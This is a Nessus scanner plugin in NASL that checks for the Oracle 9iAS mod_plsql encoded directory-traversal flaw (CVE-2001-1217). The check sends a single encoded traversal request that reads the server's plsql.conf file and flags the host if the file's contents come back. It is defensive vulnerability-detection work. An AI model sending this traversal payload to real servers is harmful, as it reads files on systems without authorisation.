#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, touched up description block (6/10/09)


include("compat.inc");

if(description)
{
 script_id(10854);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2001-1217");
 script_bugtraq_id(3727);
 script_xref(name:"OSVDB", value:"711");

 script_name(english:"Oracle 9iAS mod_plsql Encoded Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"In a default installation of Oracle 9iAS, it is possible 
to use the mod_plsql module to perform a directory traversal 
attack. This allows attackers to read arbitrary files on
the server." );
 script_set_attribute(attribute:"see_also", value:"http://otn.oracle.com/deploy/security/pdf/modplsql.pdf" );
 script_set_attribute(attribute:"see_also", value:"http://www.nextgenss.com/advisories/plsql.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.oracle.com/" );
 script_set_attribute(attribute:"solution", value:
"Download the patch from the oracle metalink site." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Tests for Oracle9iAS mod_plsql directory traversal");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Matt Moore");
 script_family(english:"Databases");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/OracleApache");
 exit(0);
}

# Check starts here

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{ 
# Make a request for the Admin_ interface.
 req = http_get(item:"/pls/sample/admin_/help/..%255cplsql.conf",
 		port:port);
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if("Directives added for mod-plsql" >< r)	
 	security_warning(port);

 }
}
